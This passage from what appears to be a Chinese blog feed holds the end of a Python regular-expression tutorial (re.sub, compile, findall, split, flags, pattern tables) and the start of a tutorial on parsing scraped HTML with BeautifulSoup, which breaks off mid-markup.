编译时用的匹配模式，数字形式。</li></ul><p><strong>前三个为必选参数，后两个为可选参数。</strong><br><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> re<br> <br>phone = <span class="hljs-string">&quot;2004-959-559 # 这是一个电话号码&quot;</span><br> <br><span class="hljs-comment"># 删除注释</span><br>num = re.sub(<span class="hljs-string">r&#x27;#.*$&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>, phone)<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;电话号码 : &quot;</span>, num)<br> <br><span class="hljs-comment"># 移除非数字的内容</span><br>num = re.sub(<span class="hljs-string">r&#x27;\D&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>, phone)<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;电话号码 : &quot;</span>, num)<br></code></pre></td></tr></table></figure><p><strong>以上实例执行结果如下：</strong></p><blockquote><p>电话号码 :  2004-959-559<br>电话号码 :  2004959559<br><strong>repl 参数是一个函数</strong></p></blockquote><p><strong>以下实例中将字符串中的匹配的数字乘于 2：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br> <br><span class="hljs-keyword">import</span> re<br> <br><span class="hljs-comment"># 将匹配的数字乘于 2</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">double</span>(<span class="hljs-params">matched</span>):</span><br>    value = <span class="hljs-built_in">int</span>(matched.group(<span class="hljs-string">&#x27;value&#x27;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(value * <span class="hljs-number">2</span>)<br> <br>s = <span class="hljs-string">&#x27;A23G4HFD567&#x27;</span><br>print(re.sub(<span class="hljs-string">&#x27;(?P&lt;value&gt;\d+)&#x27;</span>, double, s))<br></code></pre></td></tr></table></figure><p><strong>执行输出结果为：</strong></p><blockquote><p>A46G8HFD1134</p></blockquote><p><strong>compile 函数</strong><br>compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。</p><p><strong>语法格式为：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">re.<span class="hljs-built_in">compile</span>(pattern[, flags])<br></code></pre></td></tr></table></figure><p><strong>参数：</strong></p><ul><li>pattern : 一个字符串形式的正则表达式</li><li>flags 可选，表示匹配模式，比如忽略大小写，多行模式等，具体参数为：</li><li>re.I 忽略大小写<ul><li>re.L 表示特殊字符集 \w, \W, \b, \B, \s, \S 依赖于当前环境</li><li>re.M 多行模式</li><li>re.S 即为’ . ‘并且包括换行符在内的任意字符（’ . ‘不包括换行符）</li><li>re.U 表示特殊字符集 \w, \W, \b, \B, \d, \D, \s, \S 依赖于 Unicode 字符属性数据库</li><li>re.X 为了增加可读性，忽略空格和’ # ‘后面的注释</li></ul></li></ul><p><strong>实例</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;<span class="hljs-keyword">import</span> re<br><span class="hljs-meta">&gt;&gt;&gt; </span>pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\d+&#x27;</span>)                    <span class="hljs-comment"># 用于匹配至少一个数字</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>m = pattern.match(<span class="hljs-string">&#x27;one12twothree34four&#x27;</span>)        <span class="hljs-comment"># 查找头部，没有匹配</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>print( m )<br><span class="hljs-literal">None</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>m = pattern.match(<span class="hljs-string">&#x27;one12twothree34four&#x27;</span>, <span class="hljs-number">2</span>, <span class="hljs-number">10</span>) <span class="hljs-comment"># 从&#x27;e&#x27;的位置开始匹配，没有匹配</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>print( m )<br><span class="hljs-literal">None</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>m = pattern.match(<span class="hljs-string">&#x27;one12twothree34four&#x27;</span>, <span class="hljs-number">3</span>, <span class="hljs-number">10</span>) <span class="hljs-comment"># 从&#x27;1&#x27;的位置开始匹配，正好匹配</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>print( m )                                        <span class="hljs-comment"># 返回一个 Match 对象</span><br>&lt;_sre.SRE_Match <span class="hljs-built_in">object</span> at <span class="hljs-number">0x10a42aac0</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>m.group(<span class="hljs-number">0</span>)   <span class="hljs-comment"># 可省略 0</span><br><span class="hljs-string">&#x27;12&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>m.start(<span class="hljs-number">0</span>)   <span class="hljs-comment"># 可省略 0</span><br><span class="hljs-number">3</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>m.end(<span class="hljs-number">0</span>)     <span class="hljs-comment"># 可省略 0</span><br><span class="hljs-number">5</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>m.span(<span class="hljs-number">0</span>)    <span class="hljs-comment"># 可省略 0</span><br>(<span class="hljs-number">3</span>, <span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>在上面，当匹配成功时返回一个 Match 对象，其中：</p><ul><li>group([group1, …]) 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 group() 或 group(0)；</li><li>start([group]) 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0；</li><li>end([group]) 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0；</li><li>span([group]) 方法返回 (start(group), end(group))。</li></ul><p><strong>再看看一个例子：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;<span class="hljs-keyword">import</span> re<br><span class="hljs-meta">&gt;&gt;&gt; </span>pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;([a-z]+) ([a-z]+)&#x27;</span>, re.I)   <span class="hljs-comment"># re.I 表示忽略大小写</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>m = pattern.match(<span class="hljs-string">&#x27;Hello World Wide Web&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>print( m )                            <span class="hljs-comment"># 匹配成功，返回一个 Match 对象</span><br>&lt;_sre.SRE_Match <span class="hljs-built_in">object</span> at <span class="hljs-number">0x10bea83e8</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>m.group(<span class="hljs-number">0</span>)                            <span class="hljs-comment"># 返回匹配成功的整个子串</span><br><span class="hljs-string">&#x27;Hello World&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>m.span(<span class="hljs-number">0</span>)                             <span class="hljs-comment"># 返回匹配成功的整个子串的索引</span><br>(<span class="hljs-number">0</span>, <span class="hljs-number">11</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>m.group(<span class="hljs-number">1</span>)                            <span class="hljs-comment"># 返回第一个分组匹配成功的子串</span><br><span class="hljs-string">&#x27;Hello&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>m.span(<span class="hljs-number">1</span>)                             <span class="hljs-comment"># 返回第一个分组匹配成功的子串的索引</span><br>(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>m.group(<span class="hljs-number">2</span>)                            <span class="hljs-comment"># 返回第二个分组匹配成功的子串</span><br><span class="hljs-string">&#x27;World&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>m.span(<span class="hljs-number">2</span>)                             <span class="hljs-comment"># 返回第二个分组匹配成功的子串索引</span><br>(<span class="hljs-number">6</span>, <span class="hljs-number">11</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>m.groups()                            <span class="hljs-comment"># 等价于 (m.group(1), m.group(2), ...)</span><br>(<span class="hljs-string">&#x27;Hello&#x27;</span>, <span class="hljs-string">&#x27;World&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>m.group(<span class="hljs-number">3</span>)                            <span class="hljs-comment"># 不存在第三个分组</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>IndexError: no such group<br></code></pre></td></tr></table></figure><p><strong>findall</strong><br>在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。</p><p>注意： match 和 search 是匹配一次 findall 匹配所有。<br><strong>语法格式为：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">re.findall(pattern, string, flags=<span class="hljs-number">0</span>)<br>或<br>pattern.findall(string[, pos[, endpos]])<br></code></pre></td></tr></table></figure><p><strong>参数：</strong></p><ul><li>pattern 匹配模式。</li><li>string 待匹配的字符串。</li><li>pos 可选参数，指定字符串的起始位置，默认为 0。</li><li>endpos 可选参数，指定字符串的结束位置，默认为字符串的长度。</li></ul><p><strong>查找字符串中的所有数字：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br> <br>result1 = re.findall(<span class="hljs-string">r&#x27;\d+&#x27;</span>,<span class="hljs-string">&#x27;runoob 123 google 456&#x27;</span>)<br> <br>pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\d+&#x27;</span>)   <span class="hljs-comment"># 查找数字</span><br>result2 = pattern.findall(<span class="hljs-string">&#x27;runoob 123 google 456&#x27;</span>)<br>result3 = pattern.findall(<span class="hljs-string">&#x27;run88oob123google456&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>)<br> <br>print(result1)<br>print(result2)<br>print(result3)<br></code></pre></td></tr></table></figure><p><strong>输出结果：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-string">&#x27;123&#x27;</span>, <span class="hljs-string">&#x27;456&#x27;</span>]<br>[<span class="hljs-string">&#x27;123&#x27;</span>, <span class="hljs-string">&#x27;456&#x27;</span>]<br>[<span class="hljs-string">&#x27;88&#x27;</span>, <span class="hljs-string">&#x27;12&#x27;</span>]<br></code></pre></td></tr></table></figure><p><strong>re.finditer</strong><br>和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">re.finditer(pattern, string, flags=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>pattern</td><td>匹配的正则表达式</td></tr><tr><td>string</td><td>要匹配的字符串</td></tr><tr><td>flags</td><td>标志位，用于控制正则表达式的匹配方式</td></tr></tbody></table><p><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br> <br>it = re.finditer(<span class="hljs-string">r&quot;\d+&quot;</span>,<span class="hljs-string">&quot;12a32bc43jf3&quot;</span>) <br><span class="hljs-keyword">for</span> match <span class="hljs-keyword">in</span> it: <br>    <span class="hljs-built_in">print</span> (match.group() )<br></code></pre></td></tr></table></figure><p><strong>输出结果：</strong></p><blockquote><p>12<br>32<br>43<br>3</p></blockquote><p><strong>re.split</strong><br>split 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">re.split(pattern, string[, maxsplit=<span class="hljs-number">0</span>, flags=<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure><p><strong>参数：</strong></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>pattern</td><td>匹配的正则表达式</td></tr><tr><td>string</td><td>要匹配的字符串</td></tr><tr><td>maxsplit</td><td>分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数</td></tr><tr><td>flags</td><td>标志位，用于控制正则表达式的匹配方式</td></tr></tbody></table><p><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;<span class="hljs-keyword">import</span> re<br><span class="hljs-meta">&gt;&gt;&gt; </span>re.split(<span class="hljs-string">&#x27;\W+&#x27;</span>, <span class="hljs-string">&#x27;runoob, runoob, runoob.&#x27;</span>)<br>[<span class="hljs-string">&#x27;runoob&#x27;</span>, <span class="hljs-string">&#x27;runoob&#x27;</span>, <span class="hljs-string">&#x27;runoob&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>re.split(<span class="hljs-string">&#x27;(\W+)&#x27;</span>, <span class="hljs-string">&#x27; runoob, runoob, runoob.&#x27;</span>) <br>[<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;runoob&#x27;</span>, <span class="hljs-string">&#x27;, &#x27;</span>, <span class="hljs-string">&#x27;runoob&#x27;</span>, <span class="hljs-string">&#x27;, &#x27;</span>, <span class="hljs-string">&#x27;runoob&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>re.split(<span class="hljs-string">&#x27;\W+&#x27;</span>, <span class="hljs-string">&#x27; runoob, runoob, runoob.&#x27;</span>, <span class="hljs-number">1</span>) <br>[<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;runoob, runoob, runoob.&#x27;</span>]<br> <br><span class="hljs-meta">&gt;&gt;&gt; </span>re.split(<span class="hljs-string">&#x27;a*&#x27;</span>, <span class="hljs-string">&#x27;hello world&#x27;</span>)   <span class="hljs-comment"># 对于一个找不到匹配的字符串而言，split 不会对其作出分割</span><br>[<span class="hljs-string">&#x27;hello world&#x27;</span>]<br></code></pre></td></tr></table></figure><h4 id="正则表达式对象"><a href="#正则表达式对象" class="headerlink" title="正则表达式对象"></a>正则表达式对象</h4><p><strong>re.RegexObject</strong><br>re.compile() 返回 RegexObject 对象。<br><strong>re.MatchObject</strong></p><ul><li>group() 返回被 RE 匹配的字符串。</li><li>start() 返回匹配开始的位置</li><li>end() 返回匹配结束的位置</li><li>span() 返回一个元组包含匹配 (开始,结束) 的位置<h4 id="正则表达式修饰符-可选标志"><a href="#正则表达式修饰符-可选标志" class="headerlink" title="正则表达式修饰符 - 可选标志"></a>正则表达式修饰符 - 可选标志</h4>正则表达式可以包含一些可选标志修饰符来控制匹配的模式。修饰符被指定为一个可选的标志。多个标志可以通过按位 OR(|) 它们来指定。<br>如 re.I | re.M 被设置成 I 和 M 标志：</li></ul><table><thead><tr><th>修饰符</th><th>描述</th></tr></thead><tbody><tr><td>re.I</td><td>使匹配对大小写不敏感</td></tr><tr><td>re.L</td><td>做本地化识别（locale-aware）匹配</td></tr><tr><td>re.M</td><td>多行匹配，影响 ^ 和 $</td></tr><tr><td>re.S</td><td>使 . 匹配包括换行在内的所有字符</td></tr><tr><td>re.U</td><td>根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.</td></tr><tr><td>re.X</td><td>该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。</td></tr></tbody></table><h4 id="正则表达式模式"><a href="#正则表达式模式" class="headerlink" title="正则表达式模式"></a>正则表达式模式</h4><p>模式字符串使用特殊的语法来表示一个正则表达式：</p><p>字母和数字表示他们自身。一个正则表达式模式中的字母和数字匹配同样的字符串。</p><p>多数字母和数字前加一个反斜杠时会拥有不同的含义。</p><p>标点符号只有被转义时才匹配自身，否则它们表示特殊的含义。</p><p>反斜杠本身需要使用反斜杠转义。</p><p>由于正则表达式通常都包含反斜杠，所以你最好使用原始字符串来表示它们。模式元素(如 r’\t’，等价于 \t )匹配相应的特殊字符。</p><p>下表列出了正则表达式模式语法中的特殊元素。如果你使用模式的同时提供了可选的标志参数，某些模式元素的含义会改变。</p><table><thead><tr><th>模式</th><th>描述</th></tr></thead><tbody><tr><td>^</td><td>匹配字符串的开头</td></tr><tr><td>$</td><td>匹配字符串的末尾。</td></tr><tr><td>.</td><td>匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。</td></tr><tr><td>[…]</td><td>用来表示一组字符,单独列出：[amk] 匹配 ‘a’，’m’或’k’</td></tr><tr><td>[^…]</td><td>不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。</td></tr><tr><td>re*</td><td>匹配0个或多个的表达式。</td></tr><tr><td>re+</td><td>匹配1个或多个的表达式。</td></tr><tr><td>re?</td><td>匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式</td></tr><tr><td>re{ n}</td><td>匹配n个前面表达式。例如，”o{2}”不能匹配”Bob”中的”o”，但是能匹配”food”中的两个o。</td></tr><tr><td>re{ n,}</td><td>精确匹配n个前面表达式。例如，”o{2,}”不能匹配”Bob”中的”o”，但能匹配”foooood”中的所有o。”o{1,}”等价于”o+”。”o{0,}”则等价于”o*”。</td></tr><tr><td>re{ n, m}</td><td>匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式</td></tr><tr><td>a</td><td>b</td></tr><tr><td>(re)</td><td>匹配括号内的表达式，也表示一个组</td></tr><tr><td>(?imx)</td><td>正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。</td></tr><tr><td>(?-imx)</td><td>正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。</td></tr><tr><td>(?: re)</td><td>类似 (…), 但是不表示一个组</td></tr><tr><td>(?imx: re)</td><td>在括号中使用i, m, 或 x 可选标志</td></tr><tr><td>(?-imx: re)</td><td>在括号中不使用i, m, 或 x 可选标志</td></tr><tr><td>(?#…)</td><td>注释.</td></tr><tr><td>(?= re)</td><td>前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。</td></tr><tr><td>(?! re)</td><td>前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功。</td></tr><tr><td>(?&gt; re)</td><td>匹配的独立模式，省去回溯。</td></tr><tr><td>\w</td><td>匹配数字字母下划线</td></tr><tr><td>\W</td><td>匹配非数字字母下划线</td></tr><tr><td>\s</td><td>匹配任意空白字符，等价于 [\t\n\r\f]。</td></tr><tr><td>\S</td><td>匹配任意非空字符</td></tr><tr><td>\d</td><td>匹配任意数字，等价于 [0-9]。</td></tr><tr><td>\D</td><td>匹配任意非数字</td></tr><tr><td>\A</td><td>匹配字符串开始</td></tr><tr><td>\Z</td><td>匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。</td></tr><tr><td>\z</td><td>匹配字符串结束</td></tr><tr><td>\G</td><td>匹配最后匹配完成的位置。</td></tr><tr><td>\b</td><td>匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。</td></tr><tr><td>\B</td><td>匹配非单词边界。’er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。</td></tr><tr><td>\n, \t, 等。</td><td>匹配一个换行符。匹配一个制表符, 等</td></tr><tr><td>\1…\9</td><td>匹配第n个分组的内容。</td></tr><tr><td>\10</td><td>匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。</td></tr></tbody></table><h4 id="正则表达式实例"><a href="#正则表达式实例" class="headerlink" title="正则表达式实例"></a>正则表达式实例</h4><p>字符匹配</p><table><thead><tr><th>实例</th><th>描述</th></tr></thead><tbody><tr><td>python</td><td>匹配 “python”.</td></tr></tbody></table><p>字符类</p><table><thead><tr><th>实例</th><th>描述</th></tr></thead><tbody><tr><td>[Pp]ython</td><td>匹配 “Python” 或 “python”</td></tr><tr><td>rub[ye]</td><td>匹配 “ruby” 或 “rube”</td></tr><tr><td>[aeiou]</td><td>匹配中括号内的任意一个字母</td></tr><tr><td>[0-9]</td><td>匹配任何数字。类似于 [0123456789]</td></tr><tr><td>[a-z]</td><td>匹配任何小写字母</td></tr><tr><td>[A-Z]</td><td>匹配任何大写字母</td></tr><tr><td>[a-zA-Z0-9]</td><td>匹配任何字母及数字</td></tr><tr><td>[^aeiou]</td><td>除了aeiou字母以外的所有字符</td></tr><tr><td>[^0-9]</td><td>匹配除了数字外的字符</td></tr></tbody></table><p>特殊字符类</p><table><thead><tr><th>实例</th><th>描述</th></tr></thead><tbody><tr><td>.</td><td>匹配除 “\n” 之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用象 ‘[.\n]’ 的模式。</td></tr><tr><td>\d</td><td>匹配一个数字字符。等价于 [0-9]。</td></tr><tr><td>\D</td><td>匹配一个非数字字符。等价于 [^0-9]。</td></tr><tr><td>\s</td><td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。</td></tr><tr><td>\S</td><td>匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。</td></tr><tr><td>\w</td><td>匹配包括下划线的任何单词字符。等价于’[A-Za-z0-9_]’。</td></tr><tr><td>\W</td><td>匹配任何非单词字符。等价于 ‘[^A-Za-z0-9_]’。</td></tr></tbody></table><p>获取更多Python知识，请移步：<a href="https://www.runoob.com/">菜鸟教程</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫之数据解析</title>
      <link href="/2021/04/15/%E7%88%AC%E8%99%AB%E4%B9%8B%E6%95%B0%E6%8D%AE%E8%A7%A3%E6%9E%90/"/>
      <url>/2021/04/15/%E7%88%AC%E8%99%AB%E4%B9%8B%E6%95%B0%E6%8D%AE%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="爬虫之数据解析"><a href="#爬虫之数据解析" class="headerlink" title="爬虫之数据解析"></a>爬虫之数据解析</h3><p><strong>上一节学习了requests模块的使用，这一节学习数据解析。</strong></p><h4 id="数据解析分类"><a href="#数据解析分类" class="headerlink" title="数据解析分类"></a>数据解析分类</h4><ul><li>正则表达式</li><li>bs4</li><li>xpath（重要）<h4 id="数据解析原理概述"><a href="#数据解析原理概述" class="headerlink" title="数据解析原理概述"></a>数据解析原理概述</h4></li><li>解析的局部的文本内容都会在标签之间或者标签对应的属性中进行存储</li><li>进行指定标签的定位</li><li>标签或者标签对应的属性中存储的数据值进行提取（解析）<h4 id="聚焦爬虫"><a href="#聚焦爬虫" class="headerlink" title="聚焦爬虫"></a>聚焦爬虫</h4></li></ul><p><strong>编码流程：</strong></p><ul><li>指定url</li><li>发起请求</li><li>获取响应数据</li><li>数据解析</li><li>持久化存储<h4 id="学习基础：Python之正则表达式"><a href="#学习基础：Python之正则表达式" class="headerlink" title="学习基础：Python之正则表达式"></a>学习基础：Python之正则表达式</h4>请移步至另一章：<a href="https://1905060202.github.io/2021/04/16/python%E4%B9%8B%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">python之正则表达式</a><h4 id="使用bs4进行数据解析"><a href="#使用bs4进行数据解析" class="headerlink" title="使用bs4进行数据解析"></a>使用bs4进行数据解析</h4>数据解析原理：</li><li>标签定位</li><li>提取标签、标签属性中存储的数据值<br>bs4数据解析原理：</li><li>实例化一个BeautifulSoup对象，并且将页面源码数据加载到该对象中</li><li>通过调用BeautifulSoup对象中相关的属性或者方法进行标签定位和数据提取</li></ul><p><strong>数据解析步骤：</strong><br>环境安装：</p><ul><li>pip install bs4</li><li>pip install lxml<br>bs4数据解析步骤：</li><li>导包，from bs4 import BeautifulSoup</li><li>实例化bs4对象的两种方法<blockquote><p>1.将本地html文档中的数据加载到该对象中</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./苏州大学.html&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>soup = BeautifulSoup(fp,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br></code></pre></td></tr></table></figure><blockquote><p><strong>2.将互联网上获取的页面源码加载到该对象中</strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">page_text = response.text<br>soup = BeautifulSoup(page_text,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br></code></pre></td></tr></table></figure></li><li>提供的用于数据解析的方法和属性：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">soup.tagName:返回的是html中第一次出现的tagName标签<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">soup.find():<br>- find(<span class="hljs-string">&#x27;tagName&#x27;</span>):等同于soup.tagName<br>- 属性定位：<br>soup.find(<span class="hljs-string">&#x27;div&#x27;</span>,class_或<span class="hljs-built_in">id</span>或attr = <span class="hljs-string">&#x27;song&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">soup.find_all:<br>- soup.find_all(<span class="hljs-string">&#x27;tagName&#x27;</span>):返回符合要求的所有标签（列表），同find，一样拥有属性定位功能<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">soup.select:<br>- soup.select(<span class="hljs-string">&#x27;某种选择器(id,class,标签...选择器&#x27;</span>)，返回的是一个列表.<br>层级选择器:<br>- soup.select(<span class="hljs-string">&#x27;.tang &gt; ul &gt; li &gt; a&#x27;</span>)[<span class="hljs-number">0</span>] <span class="hljs-comment">#层级选择器,&gt;代表一个层级(注意两边要有空格),而[n]代表第n个元素</span><br>- soup.select(<span class="hljs-string">&#x27;.tang &gt; ul a&#x27;</span>) <span class="hljs-comment">#空格表示多个层级</span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 